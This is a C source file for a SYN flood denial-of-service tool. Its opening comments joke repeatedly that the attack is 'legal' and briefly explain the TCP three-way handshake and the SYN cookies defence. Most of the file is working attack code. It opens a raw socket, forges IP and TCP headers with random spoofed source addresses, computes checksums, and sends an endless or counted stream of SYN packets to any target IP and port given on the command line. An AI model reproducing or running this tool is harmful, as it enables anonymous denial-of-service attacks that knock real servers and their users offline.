// an attack (which is meant to be used legally) to
// legally blow up a server (legally) which explores
// (legally) the three-way handshake of a TCP connection
// (did i mention legally?)
//
// given that this attack is easily blocked by
// using SYN Cookies or any other such crap, it's
// pretty much useless (but cool and legal)
//
// i love to legally explode a server
//
// uselessness: legally/10

/*
SIMPLIFIED OPERATION:

TCP THREE-WAY HANDSHAKE:

client  ->   server   ->    client    ->  server
	   SYN        SYN + ACK           ACK

the (legal) detail is that the server, after sending
the SYN-ACK, would need to maintain state for that
specific connection until it receives the final ACK back

the SYN flood attack sends a huge number of SYN packets
with source address that tipically do not exit (spoofing),
and it does not complete the handshake for any of these
connections (if it uses spoofing, this will happen naturally)

since the server would maintain a state for each of these
connections for a specific period of time, until the
final ACK is received, and naturally has a limit on the
number of connections (of this nature) it can handle,
it would become unable to establish connections with
legitimate clients (who cares?)


SYN COOKIES (it's over)

intead of immediately storing the connection state,
the server encodes some information necessary to reconstruct
it within the TCP sequence number sent in the SYN-ACK
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <netdb.h>

/* ---------------- IP checksum ---------------- */
static unsigned short csum(void* buf, int len) {
	unsigned long sum = 0;
	unsigned short *p = buf;
	
	while (len > 1) { sum += *p++; len -= 2; }
	if (len == 1) sum += *(unsigned char*) p;
	
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	
	return (unsigned short)(~sum);
}

/* ---------------- TCP pseudo-header checksum ---------------- */
static unsigned short 
tcp_csum(
	struct iphdr* iph, 
	struct tcphdr* tcph, 
	int tlen) 
{
	struct {
		unsigned int  saddr;
		unsigned int  daddr;
		unsigned char zero;
		unsigned char proto;
		unsigned short len;
	} __attribute__((packed)) ph;
	
	char buf[65536];

	ph.saddr = iph->saddr;
	ph.daddr = iph->daddr;
	ph.zero  = 0;
	ph.proto = IPPROTO_TCP;
	ph.len   = htons(tlen);

	int total = sizeof(ph) + tlen;
	memcpy(buf, &ph, sizeof(ph));
	memcpy(buf + sizeof(ph), tcph, tlen);
	
	return csum(buf, total);
}

static unsigned int rand_ip(void) {
	/* avoid 0.x, 127.x, 224.x+, and 255.255.255.255 */
	unsigned int ip;
	do {
		ip = (rand() << 16) | (rand() & 0xffff);
	} while ((ip & 0xff) == 0 || (ip >> 24) == 127 ||
			 (ip >> 24) >= 224 || ip == 0xffffffff);
	
	return ip;
}

int main(int argc, char **argv) {
	if (argc != 4) {
		fprintf(stderr, "usage: %s <target-ip> <port> <count|0=infinite>\n", argv[0]);
		return 1;
	}

	const char *target = argv[1];
	int dport = atoi(argv[2]);
	long long count = atoll(argv[3]);

	srand(time(NULL) ^ getpid());

	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sock < 0) { perror("socket"); return 1; }

	int one = 1;
	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
		perror("setsockopt IP_HDRINCL"); return 1;
	}

	struct sockaddr_in dst;
	memset(&dst, 0, sizeof(dst));
	dst.sin_family = AF_INET;
	dst.sin_port   = htons(dport);
	if (inet_pton(AF_INET, target, &dst.sin_addr) != 1) {
		fprintf(stderr, "bad target ip\n"); return 1;
	}

	/* one reusable buffer: IP header + TCP header (no payload) */
	char pkt[sizeof(struct iphdr) + sizeof(struct tcphdr)];
	memset(pkt, 0, sizeof(pkt));

	struct iphdr*  iph  = (struct iphdr*) pkt;
	struct tcphdr* tcph = (struct tcphdr*) (pkt + sizeof(struct iphdr));

	iph->ihl      = 5;
	iph->version  = 4;
	iph->tos      = 0;
	iph->tot_len  = htons(sizeof(pkt));
	iph->id       = htons(rand() & 0xffff);
	iph->frag_off = 0;
	iph->ttl      = 64;
	iph->protocol = IPPROTO_TCP;
	iph->saddr    = rand_ip();          /* spoofed source */
	iph->daddr    = dst.sin_addr.s_addr;

	tcph->source  = htons(1024 + (rand() % 60000));
	tcph->dest    = htons(dport);
	tcph->seq     = htonl(rand());
	tcph->ack_seq = 0;
	tcph->doff    = 5;
	tcph->syn     = 1;                  /* <-- the flood flag */
	tcph->window  = htons(5840);
	tcph->check   = 0;
	tcph->urg_ptr = 0;

	long long sent = 0;
	for (;;) {
		/* rotate source / seq so each SYN looks like a fresh connection */
		iph->saddr    = rand_ip();
		iph->id       = htons(rand() & 0xffff);
		tcph->source  = htons(1024 + (rand() % 60000));
		tcph->seq     = htonl(rand());

		iph->check = 0;
		iph->check = csum(iph, sizeof(struct iphdr));

		tcph->check = 0;
		tcph->check = tcp_csum(iph, tcph, sizeof(struct tcphdr));

		if (sendto(sock, pkt, sizeof(pkt), 0,
				   (struct sockaddr*) &dst, sizeof(dst)) < 0) {
			perror("sendto");
		}

		if ((++sent % 10000) == 0)
			fprintf(stderr, "\rsent %lld SYN packets", sent);

		if (count && sent >= count) break;
	}

	fprintf(stderr, "\ndone, sent %lld packets\n", sent);
	close(sock);
	return 0;
}